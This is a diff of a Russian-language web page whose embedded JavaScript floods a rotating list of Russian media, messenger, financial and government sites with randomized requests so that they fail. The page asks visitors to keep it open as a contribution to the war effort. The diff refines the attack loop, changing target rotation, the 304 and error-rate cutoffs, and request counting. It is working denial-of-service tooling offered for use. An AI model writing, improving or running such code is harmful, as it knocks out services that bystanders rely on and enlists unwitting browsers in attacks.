@@ -41,7 +41,7 @@
           <p>Россия распространяет дезинформацию и ложь через свои подконтрольные государству СМИ, говоря населению, что это во имя свободы и единства. Тем временем российские войска совершают широкомасштабные военные преступления, нападая на больницы, детей и машины скорой помощи.</p>
           <p>Этот веб-сайт содержит скрипт, который постоянно наводняет российские СМИ, мессенджеры, финансовые и государственные службы поддельными запросами, что в конечном итоге приводит к сбою этих сайтов.</p>
           <p>Статистику текущего сеанса можно найти ниже. Количество запросов — это количество запросов к веб-сайту. Количество ошибок — это количество раз, когда веб-сайт не ответил.</p>
-          <p>Ваш веб-браузер может начать работать медленнее, но этот небольшой вклад очень поможет замедлить боевой дух и боевой дух русских.</p>
+          <p>Ваш веб-браузер может начать работать медленнее, но этот небольшой вклад очень поможет замедлить войну и уронить боевой дух русских.</p>
           <p>слава украине</p>
         </td>
       </tr>
@@ -126,6 +126,7 @@
         await queue.shift()
       }
       rand = i % 3 === 0 ? '' : ('?' + Math.random() * 2000)
+      targets[target].number_of_requests++;
       queue.push(
         fetchWithTimeout(target+rand, { timeout: 1000 })
           .catch((error) => {
@@ -138,38 +139,41 @@
           })
           .then((response) => {
             if (targets[target]) {
-              if (response && !response.ok) {
-                targets[target].number_of_errored_responses++;
+              if (response) {
+                if (response.status == 304) {
+                  targets[target].active = false;
+                } else if (!response.ok) {
+                  targets[target].number_of_errored_responses++;
+                }
               }
-              targets[target].number_of_requests++;
             }
           })
-
-      )
+      );
     }
     delete targets[target];
   }
 
   async function refresh_targets() {
-    var to_replace = 0;
-    for (target of Object.entries(targets)) {
+    targets_list = Object.entries(targets);
+    for (target of targets_list) {
       if (target[1].number_of_errored_responses / target[1].number_of_requests > 0.9) {
         targets[target[0]].active = false;
-        to_replace++;
       }
     }
+    var to_replace = g_targets_qty - targets_list.filter(e => e[1].active).length;
     var new_targets = await get_targets(to_replace);
     targets = {...targets, ...new_targets};
     Object.keys(new_targets).map(flood);
   }
 
   // Start
+  var g_targets_qty = 20;
   document.getElementById('refreshed').innerHTML = Date();
   setInterval(() => {location.reload();}, 3600 * 1000);
   setInterval(refresh_targets, 300 * 1000);
-  var promise = get_targets(200);
-  promise.then(result => {
-    targets = result;
-    Object.keys(targets).map(flood)
+  var promise = get_targets(g_targets_qty);
+  promise.then(result => { 
+    targets = result; 
+    Object.keys(targets).map(flood) 
   });
 </script>
